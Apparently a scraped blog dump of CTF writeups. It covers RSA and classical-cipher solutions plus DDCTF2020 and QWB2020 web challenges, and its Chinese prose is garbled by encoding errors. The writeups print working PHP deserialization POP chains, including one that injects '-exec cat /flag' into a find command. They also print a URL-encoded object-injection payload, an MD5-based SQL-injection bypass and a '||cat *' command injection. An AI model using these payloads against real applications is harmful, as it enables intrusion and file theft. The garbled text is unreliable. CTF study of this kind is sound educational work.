q=n//(((dp*e-1)//i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi return de = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751d=getd(n,e,dp)m=pow(c,d,n)print(libnum.n2s(m)) å¼‚æ€§ç›¸å¸é¢˜ç›®ï¼š 123asadsasdasdasdasdasdasdasdasdasdqwesqfá¼‡Ì€Ğˆå”’á€ƒå¡”å±‹ä©˜å–å‰„äƒå ‚Ù†ä”å˜…å‡á‰„ä©á¬” å¼‚æ€§ç›¸å¸ï¼Œå¼‚æˆ–ï¼Ÿå¯ä»¥çœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶å¤§å°æ˜¯ç›¸ç­‰çš„ expï¼š 1234s1 = open(&#x27;1.txt&#x27;).read()s2 = open(&#x27;key.txt&#x27;).read()for i,j in zip(s1,s2): print(chr(ord(i)^ord(j)),end=&#x27;&#x27;) RSAç»™äº†ä¸¤ä¸ªæ–‡ä»¶flag.encå’Œpub.key,å…ˆæå–å‡ºnå’Œeï¼Œå†ç”¨yafuåˆ†è§£å‡ºpå’Œq 1234567from Crypto.PublicKey import RSApath = &#x27;pub.key&#x27;with open(path) as f: key = RSA.import_key(f.read()) print(&#x27;e = %d&#x27; % key.e) print(&#x27;n = %d&#x27; % key.n) æ¥ç€ç”Ÿæˆç§é’¥,python2è„šæœ¬ï¼š 123456789101112131415161718192021from Crypto.PublicKey import RSAkeypair = RSA.generate(1024)keypair.p = 304008741604601924494328155975272418463keypair.q = 285960468890451637935629440372639283459keypair.e = 65537keypair.n = keypair.p * keypair.q Qn = long((keypair.p-1) * (keypair.q-1)) i = 1while (True): x = (Qn * i ) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(&#x27;private.pem&#x27;,&#x27;w&#x27;) private.write(keypair.exportKey()) private.close() æ¥ç€ç”¨opensslè§£å¯†å¾—åˆ°flag 1openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txt è¿˜åŸå¤§å¸ˆé¢˜ç›®ï¼š 1æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸²ç¥ç§˜å­—ç¬¦ä¸²ï¼šTASC?O3RJMV?WDJKX?ZM,é—®å·éƒ¨åˆ†æ˜¯æœªçŸ¥å¤§å†™å­—æ¯ï¼Œä¸ºäº†ç¡®å®šè¿™ä¸ªç¥ç§˜å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬é€šè¿‡äº†å…¶ä»–é€”å¾„è·å¾—äº†è¿™ä¸ªå­—ä¸²çš„32ä½MD5ç ã€‚ä½†æ˜¯æˆ‘ä»¬è·å¾—å®ƒçš„32ä½MD5ç ä¹Ÿæ˜¯æ®‹ç¼ºä¸å…¨ï¼ŒE903???4DAB????08?????51?80??8A?,è¯·çŒœå‡ºç¥ç§˜å­—ç¬¦ä¸²çš„åŸæœ¬æ¨¡æ ·ï¼Œå¹¶ä¸”æäº¤è¿™ä¸ªå­—ä¸²çš„32ä½MD5ç ä½œä¸ºç­”æ¡ˆã€‚ æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag&#123;&#125; æäº¤ æ ¹æ®é¢˜æ„å†™è„šæœ¬çˆ†ç ´å°±è¡Œ 1234567891011121314151617import stringimport hashlibimport reBigStr = string.ascii_uppercases1 = &#x27;TASC&#123;&#125;O3RJMV&#123;&#125;WDJKX&#123;&#125;ZM&#x27;s2 = &#x27;E903???4DAB????08?????51?80??8A?&#x27;for i in BigStr: for j in BigStr: for k in BigStr: s = s1.format(i,j,k) smd5 = hashlib.md5(str(s).encode()).hexdigest() flag = re.search(s2.replace(&#x27;?&#x27;,&#x27;.&#x27;),smd5.upper()) if flag!=None: print(s,smd5.upper()) robomunicationå¬å‡ºæ¥æ˜¯æ‘©æ–¯å¯†ç  1.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--. è§£å¯†å¾—åˆ° 1HELLOWHATISTHEKEYITISBOOPBEEP flag 1flag&#123;BOOPBEEP&#125; RSAROLLé¢˜ç›®ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#123;920139713,19&#125;70479679275221115227470416418414022368270835483295235263072905459788476483295235459788476663551792475206804459788476428313374475206804459788476425392137704796792458265677341524652483295235534149509425392137428313374425392137341524652458265677263072905483295235828509797341524652425392137475206804428313374483295235475206804459788476306220148RSA rollï¼rollï¼rollï¼Only number and a-zï¼ˆdon&#39;t use editorwhich MS provideï¼‰ å¾ˆæ˜æ˜¾å¯ä»¥çŒœåˆ°&#123;920139713,19&#125;æ˜¯ç§é’¥ï¼Œé‚£äº›æ•°å­—éƒ½æ˜¯å¯†æ–‡ï¼Œexp: 12345678910111213141516171819202122232425262728293031323334353637383940import math# åˆ†è§£å¤§æ•´æ•°def moder(n): base=2 while base &lt;math.sqrt(n): if(n%base==0): fbase=base print(base,int(n/base)) base+=1 pass f=getEuler(fbase,int(n/fbase)) print(&#x27;f(n)æ¬§æ‹‰å‡½æ•°å€¼ï¼š%d&#x27;%f)# return f# æ±‚æ¬§æ‹‰å‡½æ•°f(n)def getEuler(prime1, prime2): return (prime1-1)*(prime2-1)# æ±‚ç§é’¥ddef getDkey(e, Eulervalue):#å¯ä»¥è¾—è½¬ç›¸é™¤æ³• k = 1 while True: if (((Eulervalue * k) + 1) % e) == 0: (d,m)=divmod(Eulervalue * k + 1,e) return d#é¿å…ç§‘å­¦è®¡æ•°æ³•æœ€åè½¬intå¤±å»ç²¾åº¦ k += 1n=920139713d =getDkey(19, moder(n))print(&#x27;ç§é’¥ä¸ºï¼š %d&#x27;%d)c=[704796792,752211152,274704164,18414022,368270835,483295235,263072905,459788476,483295235,459788476,663551792,475206804, 459788476,428313374,475206804,459788476,425392137,704796792,458265677,341524652,483295235,534149509,425392137,428313374, 425392137,341524652,458265677,263072905,483295235,828509797,341524652,425392137,475206804,428313374,483295235,475206804,459788476,306220148]L=[]for x in c: L.append(pow(x,d,n))print(L)#æ˜æ–‡asciiè¡¨for x in L: print(chr(x),end=&#x27;&#x27;) Cipheré¢˜ç›®ï¼š 1è¿˜èƒ½æç¤ºä»€ä¹ˆå‘¢ï¼Ÿå…¬å¹³çš„ç©å§ï¼ˆå¯†é’¥è‡ªå·±æ‰¾ï¼‰ Dncnoqqfliqrpgeklwmppu æ³¨æ„ï¼šå¾—åˆ°çš„ flag è¯·åŒ…ä¸Š flag&#123;&#125; æäº¤, flag&#123;å°å†™å­—æ¯&#125; ä»å…¬å¹³ç©å§è”æƒ³åˆ°Playfair Cipherï¼šhttp://rumkin.com/tools/cipher/playfair.php ç›´æ¥è§£å¯†ï¼Œå¯†ç æ˜¯playfairï¼Œæ³¨æ„è¦å°å†™ Unencodeuuencodeè§£å¯†å¾—åˆ°flag:http://ctf.ssleye.com/uu.html Dangerous RSAé¢˜ç›®ï¼š 1234#n: 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L#e: 0x3#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365so,how to get the message? ä½åŠ å¯†æŒ‡æ•°å°æ˜æ–‡æ”»å‡»ï¼Œexp: 123456789import gmpy2import libnumn = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872e = 0x3c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365m = gmpy2.iroot(c, 3)[0]print(libnum.n2s(m)) è¾¾èŠ¬å¥‡å¯†ç é¢˜ç›®ï¼š 12è¾¾èŠ¬å¥‡éšè—åœ¨è’™å¨œä¸½èä¸­çš„æ•°å­—åˆ—:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 è®°å½•åœ¨è¾¾èŠ¬å¥‡çª—å°å£çš„ç¥ç§˜æ•°å­—ä¸²:36968853882116725547342176952286 å‘ç°ä¸Šé¢çš„æ•°å­—åˆ—çš„ä¸ªæ•°å’Œä¸‹é¢çš„æ•°å­—ä¸²é•¿åº¦æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯32ï¼Œä»”ç»†çœ‹ä¸Šé¢ï¼Œå‘ç°æ˜¯æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼Œå¹¶ä¸”æ˜¯ä¹±åºçš„ï¼ŒçŒœæµ‹ä¸‹é¢çš„å’Œä¸Šé¢çš„é¡ºåºä¸€æ · 12345678910111213141516s = &#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;s1 = &#x27;36968853882116725547342176952286&#x27;n0 = 1 n1 = 1flag=&#x27;&#x27;li=[]for i in s.split(&#x27; &#x27;): li.append(i)flag+=s1[li.index(&#x27;1&#x27;)]flag+=s1[li.index(&#x27;1&#x27;,10)]while len(flag)&lt;32: n = n0+n1 n0=n1 n1=n flag+=s1[li.index(str(n))]print(flag) [AFCTF2018]Morseæ‘©æ–¯å¯†ç ç›´æ¥è§£ [HDCTF2019]basic rsaé¢˜ç›®ï¼š 1234567891011121314151617import gmpy2from Crypto.Util.number import *from binascii import a2b_hex,b2a_hexflag = &quot;*****************&quot;p = 262248800182277040650192055439906580479q = 262854994239322828547925595487519915551e = 65533n = p*qc = pow(int(b2a_hex(flag),16),e,n)print c# 27565231154623519221597938803435789010285480123476977081867877272451638645710 å°±åŸºæœ¬çš„RSAï¼Œexp: 12345678910import gmpy2import libnump = 262248800182277040650192055439906580479q = 262854994239322828547925595487519915551e = 65533c = 27565231154623519221597938803435789010285480123476977081867877272451638645710d = gmpy2.invert(e, (p-1)*(q-1))m = pow(c, d, p*q)print(libnum.n2s(m)) ä¼ æ„Ÿå™¨é¢˜ç›®: 1234565555555595555A65556AA696AA6666666955è¿™æ˜¯æŸå‹åŠ›ä¼ æ„Ÿå™¨æ— çº¿æ•°æ®åŒ…è§£è°ƒåä½†æœªè§£ç çš„æŠ¥æ–‡(hex) å·²çŸ¥å…¶IDä¸º0xFED31Fï¼Œè¯·ç»§ç»­å°†æŠ¥æ–‡å®Œæ•´è§£ç ï¼Œæäº¤hexã€‚æç¤º1ï¼šæ›¼è” æç¤ºæ›¼è”ï¼Œæƒ³åˆ°æ›¼å½»æ–¯ç‰¹å¯†ç ï¼Œæ¯8ä½ååº rsa2é¢˜ç›®: 12345N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085import hashlibflag = &quot;flag&#123;&quot; + hashlib.md5(hex(d)).hexdigest() + &quot;&#125;&quot;","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://www.m00nback.xyz/tags/crypto/"}]},{"title":"DDCTF2020éƒ¨åˆ†é¢˜ç›®writeup","slug":"DDCTF2020-writeup","date":"2020-09-06T03:10:29.000Z","updated":"2020-09-09T01:33:49.888Z","comments":true,"path":"2020/09/06/DDCTF2020-writeup/","link":"","permalink":"http://www.m00nback.xyz/2020/09/06/DDCTF2020-writeup/","excerpt":"éš¾å“­äº†ï¼ğŸ˜­","text":"éš¾å“­äº†ï¼ğŸ˜­ webWebç­¾åˆ°é¢˜ä¼ ä¸‹å‚ï¼Œå¾ˆæ˜æ˜¾æ˜¯JWT å°†userRoleæ”¹æˆADMINï¼Œå¯†é’¥è®¾ç½®æˆadminæˆåŠŸå¾—åˆ°å®¢æˆ·ç«¯ï¼Œåæ¥æ‰çŸ¥é“è¿™ä¸ªå¯†ç å¥½åƒå’Œç”¨æˆ·åä¸€æ · æ¥ç€å°±ä¸ä¼šäº† å¡ç‰‡å•†åº—goè¯­è¨€æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œç›´æ¥å‘æœ‹å‹å€Ÿ1844674407370955161ä¸ªå‘ç° å¾ˆæ˜æ˜¾å‘ç”Ÿäº†æº¢å‡ºï¼Œç„¶åæŠŠå€Ÿçš„è¿˜äº†å…‘æ¢ç¤¼ç‰©å°±èƒ½å¾—åˆ° 1url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12 è®¿é—®æç¤ºä¸æ˜¯å¹¸è¿ç©å®¶ï¼Œæ‰¾åˆ°ä¼ªé€ cookieï¼šhttps://github.com/EddieIvan01/secure-cookie-faker Overwrite Meæºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;?phperror_reporting(0);class MyClass&#123; var $kw0ng; var $flag; public function __wakeup() &#123; $this-&gt;kw0ng = 1; &#125; public function get_flag() &#123; return system(&#x27;find /FlagNeverFall &#x27; . escapeshellcmd($this-&gt;flag)); &#125;&#125;class Prompter&#123; protected $hint; public function execute($value) &#123; include($value); &#125; public function __invoke() &#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\\.\\.|\\.\\//i&quot;, $this-&gt;hint)) &#123; die(&quot;Don&#x27;t Do That!&quot;); &#125; $this-&gt;execute($this-&gt;hint); &#125;&#125;class Display&#123; public $contents; public $page; public function __construct($file=&#x27;/hint/hint.php&#x27;) &#123; $this-&gt;contents = $file; echo &quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;; &#125; public function __toString() &#123; return $this-&gt;contents(); &#125; public function __wakeup() &#123; $this-&gt;page-&gt;contents = &quot;POP me! I can give you some hints!&quot;; unset($this-&gt;page-&gt;cont); &#125;&#125;class Repeater&#123; private $cont; public $content; public function __construct() &#123; $this-&gt;content = array(); &#125; public function __unset($key) &#123; $func = $this-&gt;content; return $func(); &#125;&#125;class Info&#123; function __construct() &#123; eval(&#x27;phpinfo();&#x27;); &#125;&#125;$show = new Display();$bullet = $_GET[&#x27;bullet&#x27;];if(!isset($bullet))&#123; highlight_file(__FILE__); die(&quot;Give Me Something!&quot;);&#125;else if($bullet == &#x27;phpinfo&#x27;)&#123; $infos = new Info();&#125;else&#123; $obstacle = new stdClass; $mc = new MyClass(); $mc-&gt;flag = &quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;; @unserialize($bullet); echo $mc-&gt;get_flag();&#125; è®¿é—®/hint/hint.phpæç¤ºå’ŒGMPæ‰©å±•ç›¸å…³ï¼Œæœäº†æœå‘ç°æ˜¯GMPæ‰©å±•ååºåˆ—åŒ–ç±»å‹æ··æ·†æ¼æ´ï¼šhttps://hackerone.com/reports/198734 æµ‹è¯•å»é™¤$obstacle = new stdClass;å¯ä»¥æ›¿æ¢å‚æ•° 12345678910111213141516171819202122232425&lt;?phpclass MyClass&#123; var $kw0ng; var $flag; public function __wakeup() &#123; $this-&gt;kw0ng = 1; &#125; public function get_flag() &#123; echo $this-&gt;flag.&quot;\\n&quot;; &#125;&#125;// $obstacle = new stdClass;$mc = new MyClass();$mc-&gt;flag = &quot;id&quot;;$inner = &#x27;s:1:&quot;1&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:6:&quot;whoami&quot;;i:0;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:2;&#125;&#125;&#x27;;$exp = &#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;.strlen($inner).&#x27;:&#123;&#x27;.$inner.&#x27;&#125;&#125;&#x27;;// echo urlencode($exp);@unserialize($exp);$mc-&gt;get_flag();// var_dump($obstacle); æ„é€ POPé“¾ï¼š 12345678910111213141516171819202122232425262728293031323334&lt;?phperror_reporting(0);class Prompter&#123; protected $hint; public function __construct() &#123; $this-&gt;hint = &#x27;EOf9uk3nSsVFK1LQ.php&#x27;; &#125;&#125;class Display&#123; public $contents; public $page; public function __construct() &#123; $this-&gt;page = new Repeater(); &#125;&#125;class Repeater&#123; private $cont; public $content; public function __construct() &#123; $this-&gt;content = new Prompter(); &#125;&#125;$a = new Display();$b=serialize($a);echo urlencode($b); å¯ä»¥æ–‡ä»¶åŒ…å«ï¼Œä½†ä»phpinfoæœ‰open_basediré™åˆ¶ï¼Œå‘é¡µé¢POSTä¸Šä¼ æ–‡ä»¶æ— å“åº” åæ¥æ‰çŸ¥é“ï¼ŒåŸæ¥æ˜¯å¯ä»¥ä»»æ„ç±»çš„ä»»æ„å‡½æ•°æ‰§è¡Œçš„ï¼Œæ¼æ´ç‚¹å°±åœ¨äºï¼š 12345public function __unset($key)&#123; $func = $this-&gt;content; return $func();&#125; $func()é‚£é‡Œï¼Œå¦‚æœå¯æ§çš„è¯ï¼Œå¯ä»¥ä»»æ„ç±»ä¸­çš„æ–¹æ³•è°ƒç”¨çš„ï¼Œçœ‹ä¸€ä¸ªä¾‹å­ï¼š 1234567891011121314151617181920212223&lt;?phperror_reporting(0);class T&#123; public function test() &#123; echo 456; &#125; public function test1($a)&#123; echo $a; &#125;&#125;$a = array(new T,&#x27;test&#x27;);$a();$b = array(&#x27;t&#x27;,&#x27;Test&#x27;);$b();$c = array(&#x27;t&#x27;,&#x27;test1&#x27;);$c(&#x27;456&#x27;);// ä¸Šé¢ä¸‰ä¸ªä¾‹å­å‡ä¼šè¾“å‡º456 ç”±æ­¤ï¼Œpopé“¾å¯ä»¥ä¸ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phperror_reporting(0);class MyClass&#123; var $kw0ng; var $flag; public function __construct()&#123; $this-&gt;flag = &#x27;-exec cat /flag ;&#x27;; &#125; public function __wakeup() &#123; $this-&gt;kw0ng = 1; &#125;&#125;class Display&#123; public $contents; public $page; public function __construct() &#123; $this-&gt;page = new Repeater(); &#125;&#125;class Repeater&#123; private $cont; public $content; public function __construct() &#123; $this-&gt;content = array(new MyClass(),&#x27;get_flag&#x27;); &#125;&#125;$a = new Display();$b=serialize($a);echo urlencode($b);","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"}]},{"title":"å¼ºç½‘æ¯2020éƒ¨åˆ†é¢˜ç›®writeup","slug":"å¼ºç½‘æ¯2020-wp","date":"2020-08-26T13:25:55.000Z","updated":"2020-09-06T14:07:21.975Z","comments":true,"path":"2020/08/26/å¼ºç½‘æ¯2020-wp/","link":"","permalink":"http://www.m00nback.xyz/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/","excerpt":"ä¸æ„§æ˜¯æ²³å—ä¸¾åŠçš„æœ€å¥½çš„æ¯”èµ›ï¼","text":"ä¸æ„§æ˜¯æ²³å—ä¸¾åŠçš„æœ€å¥½çš„æ¯”èµ›ï¼ webè¾…åŠ©ç»™äº†é™„ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œå®¡ä¸‹æºç ï¼Œå‘ç°æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œå’Œ2020å®‰æ’å››æœˆèµ›å¾ˆåƒï¼Œä½†æ˜¯å¢åŠ äº†nameå…³é”®å­—è¿‡æ»¤,å¯ä»¥ç”¨Sç»•è¿‡ï¼Œ__weakupæ”¹ä¸‹å±æ€§æ•°é‡ç»•è¿‡ æ­£å¸¸åºåˆ—åŒ–,0x00ç”¨0ä»£æ›¿ï¼š 1234567891011121314151617&lt;?phpclass player&#123; protected $user; protected $pass; protected $admin; public function __construct()&#123; $this-&gt;user = &#x27;test&#x27;; $this-&gt;pass = &#x27;test&#x27;; $this-&gt;admin = 1; &#125;&#125;$a=serialize(new player());echo str_replace(chr(0),&#x27;0&#x27;,$a);// O:6:&quot;player&quot;:3:&#123;s:7:&quot;0*0user&quot;;s:4:&quot;test&quot;;s:7:&quot;0*0pass&quot;;s:4:&quot;test&quot;;s:8:&quot;0*0admin&quot;;i:1;&#125; è®¿é—®play.phpä¼šååºåˆ—åŒ–ï¼Œpopé“¾ï¼š 1topsolo::__destruct() &#x3D;&#x3D;&gt; TP() &#x3D;&#x3D;&gt; $name() &#x3D;&#x3D;&gt; midsolo::__invoke() &#x3D;&#x3D;&gt; Gank() &#x3D;&#x3D;&gt; stristr &#x3D;&#x3D;&gt; jungle::__toString() &#x3D;&#x3D;&gt; KS() æ„é€ expï¼Œæœ‰ä¸¤å¤„éœ€è¦ç»•è¿‡: 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass player&#123; protected $user; protected $pass; protected $admin; public function __construct()&#123; $this-&gt;user = &#x27;test&#x27;; $this-&gt;pass = new topsolo(); $this-&gt;admin = 1; &#125;&#125;class topsolo&#123; protected $name; public function __construct()&#123; $this-&gt;name = new midsolo(); &#125;&#125;class midsolo&#123; protected $name; public function __construct()&#123; $this-&gt;name = new jungle(); &#125;&#125;class jungle&#123; protected $name = &quot;&quot;;&#125;$a=new player();$b=serialize($a);$c=str_replace(&#x27;test&quot;&#x27;,&#x27;&#x27;,stristr($b,&#x27;test&quot;&#x27;));$d=str_replace(&#x27;s:7:&quot;&#x27;.chr(0).&#x27;*&#x27;.chr(0).&#x27;name&quot;&#x27;,&#x27;S:7:&quot;\\00\\2a\\00\\6e\\61\\6d\\65&quot;&#x27;,$c); // ç»•è¿‡checkå‡½æ•°$d=str_replace(&#x27;&quot;midsolo&quot;:1:&#x27;,&#x27;&quot;midsolo&quot;:2:&#x27;,$d); // ç»•è¿‡__weakupecho urlencode($d); æ¥ç€å†çœ‹éœ€è¦å¤šå°‘ä¸ª\\0*\\0ï¼Œä¸Šé¢åºåˆ—åŒ–ä¹‹å$passçš„é•¿åº¦æ˜¯ä¸‰ä½ï¼Œæ‰€ä»¥è¦åƒæ‰çš„å°±æ˜¯ï¼Œè¿™é‡Œ0x00æ›¿æ¢æˆ0ï¼Œé•¿åº¦ä¸º22ï¼š 1&quot;;s:7:&quot;0*0pass&quot;;s:XXX: åˆ—æ–¹ç¨‹ï¼š 15n&#x3D;3n+22+k n=11,k=0åˆšå¥½å¯ä»¥ï¼Œå› æ­¤æ„é€ payload: 1?username&#x3D;\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0&amp;password&#x3D;%3Bs%3A7%3A%22%00%2A%00pass%22%3BO%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00admin%22%3Bi%3A1%3B%7D ç„¶åè¯·æ±‚play.phpå³å¯å¾—åˆ°flag bankncè¿æ¥å‘ç°æ˜¯è¿™æ ·çš„å½¢å¼ï¼Œè®©æˆ‘ä»¬çˆ†ç ´å‰ä¸‰ä½ 1sha256(XXX+rN3KgrFumXZ3gkHew) &#x3D;&#x3D; 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc ç›´æ¥hashcatæ©ç çˆ†ç ´ 1hashcat64.exe -a 3 -m 1400 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc ?a?a?arN3KgrFumXZ3gkHew æµ‹è¯•ä¸€éä¹‹åå‘ç°ä»£ç å­˜åœ¨æ¼æ´ï¼Œç›´æ¥äº¤æ˜“çš„æ—¶å€™è¾“è´Ÿæ•°å°±èƒ½å¢åŠ cash Funhashæºç ï¼š 1234567891011121314151617181920212223&lt;?phpinclude &#x27;conn.php&#x27;;highlight_file(&quot;index.php&quot;);//level 1if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))&#123; die(&#x27;level 1 failed&#x27;);&#125;//level 2if($_GET[&#x27;hash2&#x27;] === $_GET[&#x27;hash3&#x27;] || md5($_GET[&#x27;hash2&#x27;]) !== md5($_GET[&#x27;hash3&#x27;]))&#123; die(&#x27;level 2 failed&#x27;);&#125;//level 3$query = &quot;SELECT * FROM flag WHERE password = &#x27;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#x27;&quot;;$result = $mysqli-&gt;query($query);$row = $result-&gt;fetch_assoc(); var_dump($row);$result-&gt;free();$mysqli-&gt;close();?&gt; ç¬¬ä¸€å…³æ‰¾0e+çº¯æ•°å­—md4åŠ å¯†åè¿˜æ˜¯0e+çº¯æ•°å­—çš„å­—ç¬¦ä¸²å°±è¡Œï¼Œè„šæœ¬ï¼š 1234567891011121314151617181920from concurrent.futures import ThreadPoolExecutorimport threading,timeimport hashlibdef md4(s): obj = hashlib.new(&quot;md4&quot;) obj.update(s.encode()) return obj.hexdigest()def check(id): #print(id) enc=md4(&#x27;0e&#x27;+str(id)) if enc[0:2]==&#x27;0e&#x27; and enc[2:-1].isdigit(): print(&#x27;0e&#x27;+str(id)) return 1 return 0if __name__ == &quot;__main__&quot;: thread_pool = ThreadPoolExecutor(100) for i in range(1,1000000000): thread_pool.submit(check,i) ç¬¬äºŒå…³æ•°ç»„ç»•è¿‡,ç¬¬ä¸‰å…³å’Œjavisojä¸Šçš„Loginä¸€æ ·ï¼Œæ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²MD5åŠ å¯†åå¾—åˆ°çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼åœ¨SQLä¸­æ‹¼æ¥æˆ ç±»ä¼¼ &#39;or&#39;xxxçš„å½¢å¼å°±å¯ä»¥ç»•è¿‡äº† payload: 1?hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;&amp;hash4&#x3D;ffifdyop uploadwiresharkæ‰“å¼€ å¯¼å‡ºhttpå¯¹è±¡ï¼Œå‘ç°steghide.phpï¼Œforemoståˆ†ç¦»ä¸€å¼ å›¾ç‰‡ï¼Œsteghideéšå†™ï¼Œå¯†ç å¼±å£ä»¤123456 ä¸»åŠ¨å°±è¿‡æ»¤äº†flagï¼Œç”¨*ç»•è¿‡ payload: 1?ip&#x3D;127.0.0.1||cat * æŸ¥çœ‹æºç å¾—åˆ°flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"å¼ºç½‘æ¯","slug":"å¼ºç½‘æ¯","permalink":"http://www.m00nback.xyz/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"}]},{"title":"å›½èµ›CISCN2020åˆèµ›-wp","slug":"å›½èµ›2020åˆèµ›-wp","date":"2020-08-25T14:08:04.000Z","updated":"2020-09-06T14:46:01.859Z","comments":true,"path":"2020/08/25/å›½èµ›2020åˆèµ›-wp/","link":"","permalink":"http://www.m00nback.xyz/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/","excerpt":"å­¦é•¿å¸¦æˆ‘ä»¬æ‰“äº†æ‰“ğŸ˜€","text":"å­¦é•¿å¸¦æˆ‘ä»¬æ‰“äº†æ‰“ğŸ˜€ Webeasyphpæºç ï¼š 1234567891011121314151617&lt;?php 